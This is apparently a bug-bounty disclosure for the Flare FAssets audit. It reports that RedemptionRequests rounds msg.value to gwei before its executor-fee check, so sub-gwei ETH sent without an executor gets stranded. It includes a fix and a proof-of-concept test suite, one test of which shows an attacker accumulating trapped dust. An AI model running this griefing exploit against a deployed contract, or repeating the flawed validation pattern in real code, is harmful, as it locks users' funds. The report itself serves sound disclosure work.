# #55230 \[SC-Insight] there is a sub gwei executor fee can be bypass and freezes eth in redemptionrequests

**Submitted on Sep 25th 2025 at 01:43:26 UTC by @XDZIBECX for** [**Mitigation Audit | Flare | FAssets**](https://immunefi.com/audit-competition/flare-fassets--mitigation-audit)

* **Report ID:** #55230
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/flare-foundation/fassets/commit/7dd1ddd574989c44b3057ce426ff188bc69743d1>
* **Impacts:** Permanent freezing of funds

## Description

### Brief / Intro

The new fix is unsafe because the redemption guard validates the executor fee after rounding `msg.value` down to gwei. Any sub-gwei ETH (for example 1 wei) sent with no executor bypasses the check, creating a redemption with zero executor/fee, and that ETH becomes permanently stuck on the contract.

CollateralPool and CollateralReservations handle refunds correctly; the flaw is isolated to RedemptionRequests. The recommended validation is to check raw `msg.value` before rounding:

* If `_executor == address(0)`, require `msg.value == 0`.
* If `_executor != address(0)`, optionally require `msg.value % 1 gwei == 0` to ban hidden dust.

### Vulnerability Details

The problematic line:

```
require(_executorFeeNatGWei == 0 || _executor != address(0), "executor fee without executor");
```

In RedemptionRequests the guard is applied after computing the executor fee by truncating `msg.value` to gwei:

```
uint256 executorFeeNatGWei = msg.value / Conversion.GWEI; // rounds down
```

Any `0 < msg.value < 1 gwei` becomes 0 after rounding. The require then passes for `_executor == address(0)` and `executorFeeNatGWei == 0`, allowing the call to succeed. This creates a redemption request with `executor = 0` and `executorFee = 0`, while the dust ETH remains on the contract with no refund path — permanently stranded.

Root cause: validating the gwei-rounded executor fee instead of the raw `msg.value` allows sub-gwei amounts to bypass the "no ETH unless executor is set" policy.

Other parts of the patch are safe:

* CollateralPool forwards `msg.value` only when an executor is provided; otherwise it refunds at the end.
* CollateralReservations records an executor fee only when an executor exists; if none, it refunds the excess (or burns on refund failure).

The fix in RedemptionRequests must validate raw `msg.value` before rounding to prevent dust bypass.

## Impact Details

Because the guard validates the rounded fee instead of raw `msg.value`, calls with `_executor == address(0)` and `0 < msg.value < 1 gwei` succeed and create redemption requests with zero executor fee while the sent ETH is neither refunded nor consumed. This permanently traps ETH in the AssetManager.

Consequences:

* Users can lose small amounts if wallets/UIs accidentally attach dust ETH without specifying an executor.
* Attackers can grief by repeatedly calling redeem to strand arbitrary ETH on the contract. Each call can trap up to 999,999,999 wei (\~1 gwei). Repetition can accumulate meaningful balances limited only by attacker resources and available fAssets to redeem.

There is no protocol path to reclaim this ETH for the sender (refund does not occur and the fee recorded is zero).

## References

* <https://github.com/flare-foundation/fassets/commit/7dd1ddd574989c44b3057ce426ff188bc69743d1?utm\\_source=immunefi>

## Recommended Validation (as stated in report)

* If `_executor == address(0)`, require `msg.value == 0`.
* If `_executor != address(0)`, optionally require `msg.value % 1 gwei == 0` to ban hidden dust.

## Proof of Concept

<details>

<summary>Reproduction test (add to test/unit/fasset/implementation/AssetManager.ts)</summary>

```ts
it("should revert when sending >= 1 gwei with no executor (guard works)", async () => {
    const redeemer = accounts[86];
    const underlyingRedeemer = "redeemer";
    const agentVault = await createAvailableAgentWithEOA(agentOwner1, underlyingAgent1);
    await mintFassets(agentVault, agentOwner1, underlyingAgent1, redeemer, toBN(1));

    const oneGwei = toBN(1_000_000_000); // 1 gwei
    console.log("[redeem>=1gwei] sending value (wei):", oneGwei.toString());
    await expectRevert(
        assetManager.redeem(1, underlyingRedeemer, ZERO_ADDRESS, { from: redeemer, value: oneGwei }),
        "executor fee without executor"
    );
    console.log("[redeem>=1gwei] revert confirmed (no executor with nonzero gwei)");
});

it("should accept sub-gwei ETH without executor and trap funds (loss/exploit)", async () => {
    const redeemer = accounts[87];
    const underlyingRedeemer = "redeemer";
    const agentVault = await createAvailableAgentWithEOA(agentOwner1, underlyingAgent1);
    await mintFassets(agentVault, agentOwner1, underlyingAgent1, redeemer, toBN(1));

    const dustWei = toBN(1); // < 1 gwei, gets rounded down to 0 gwei in code path
    const contractBefore = toBN(await web3.eth.getBalance(assetManager.address));
    const redeemerBefore = toBN(await web3.eth.getBalance(redeemer));
    console.log("[redeem<1gwei] contract balance before:", contractBefore.toString());
    console.log("[redeem<1gwei] redeemer balance before:", redeemerBefore.toString());
    console.log("[redeem<1gwei] sending dust (wei):", dustWei.toString());

    const tx = await assetManager.redeem(1, underlyingRedeemer, ZERO_ADDRESS, { from: redeemer, value: dustWei });

    const contractAfter = toBN(await web3.eth.getBalance(assetManager.address));
    const redeemerAfter = toBN(await web3.eth.getBalance(redeemer));
    const gasCost = toBN(tx.receipt.gasUsed).mul(toBN(tx.receipt.effectiveGasPrice));

    console.log("[redeem<1gwei] contract balance after:", contractAfter.toString());
    console.log("[redeem<1gwei] redeemer balance after:", redeemerAfter.toString());
    console.log("[redeem<1gwei] gas used:", tx.receipt.gasUsed.toString());
    console.log("[redeem<1gwei] effective gas price:", tx.receipt.effectiveGasPrice.toString());
    console.log("[redeem<1gwei] gas cost (wei):", gasCost.toString());
    console.log("[redeem<1gwei] contract delta (wei):", contractAfter.sub(contractBefore).toString());
    console.log("[redeem<1gwei] redeemer delta (wei):", redeemerAfter.sub(redeemerBefore).toString());

    // ASSERT: the 1 wei is trapped on the contract (increased balance by exactly dustWei)
    assertWeb3Equal(contractAfter.sub(contractBefore), dustWei);

    // ASSERT: request was created with no executor and zero executor fee
    const req = findRequiredEvent(tx, "RedemptionRequested").args;
    assertWeb3Equal(req.executor, ZERO_ADDRESS);
    assertWeb3Equal(req.executorFeeNatWei, toBN(0));
});

it("attacker can accumulate trapped sub-gwei dust across calls", async () => {
    const redeemer = accounts[85];
    const underlyingRedeemer = "redeemer";
    const agentVault = await createAvailableAgentWithEOA(agentOwner1, underlyingAgent1);

    const times = 7;
    const lotsToMint = toBN(times); // ensure we have enough f-assets for all rounds
    await mintFassets(agentVault, agentOwner1, underlyingAgent1, redeemer, lotsToMint);

    const dustWei = toBN(1); // < 1 gwei so it bypasses the executor-fee guard
    const before = toBN(await web3.eth.getBalance(assetManager.address));
    console.log("[accumulate] contract balance before:", before.toString());

    for (let i = 0; i < times; i++) {
        try {
            const tx = await assetManager.redeem(1, underlyingRedeemer, ZERO_ADDRESS, { from: redeemer, value: dustWei });
            const gasCost = toBN(tx.receipt.gasUsed).mul(toBN(tx.receipt.effectiveGasPrice));
            const req = findRequiredEvent(tx, "RedemptionRequested").args;
            const current = toBN(await web3.eth.getBalance(assetManager.address));
            console.log(`[accumulate] round ${i + 1} ok; gasUsed=${tx.receipt.gasUsed} gasPrice=${tx.receipt.effectiveGasPrice} gasCost=${gasCost.toString()} reqId=${req.requestId.toString()} contractBalanceNow=${current.toString()}`);
        } catch (e) {
            const current = toBN(await web3.eth.getBalance(assetManager.address));
            console.log(`[accumulate] round ${i + 1} failed; contractBalanceNow=${current.toString()} error=${(e as Error).message}`);
            throw e;
        }
    }

    const after = toBN(await web3.eth.getBalance(assetManager.address));
    console.log("[accumulate] contract balance after:", after.toString());
    console.log("[accumulate] expected trapped (wei):", toBN(times).toString());
    console.log("[accumulate] actual trapped (wei):", after.sub(before).toString());

    assertWeb3Equal(after.sub(before), toBN(times));
});
```

Example output from the test run:

```
   ✔ should do a redemption payment default by executor (132ms)
[redeem>=1gwei] sending value (wei): 1000000000
[redeem>=1gwei] revert confirmed (no executor with nonzero gwei)
      ✔ should revert when sending >= 1 gwei with no executor (guard works) (119ms)
[redeem<1gwei] contract balance before: 0
[redeem<1gwei] redeemer balance before: 100000000000000000000000000000000
[redeem<1gwei] sending dust (wei): 1
[redeem<1gwei] contract balance after: 1
...
      ✔ should accept sub-gwei ETH without executor and trap funds (loss/exploit) (141ms)
[accumulate] contract balance before: 0
[accumulate] round 1 ok; ... contractBalanceNow=1
...
[accumulate] contract balance after: 7
[accumulate] expected trapped (wei): 7
[accumulate] actual trapped (wei): 7
      ✔ attacker can accumulate trapped sub-gwei dust across calls (158ms)
```

</details>
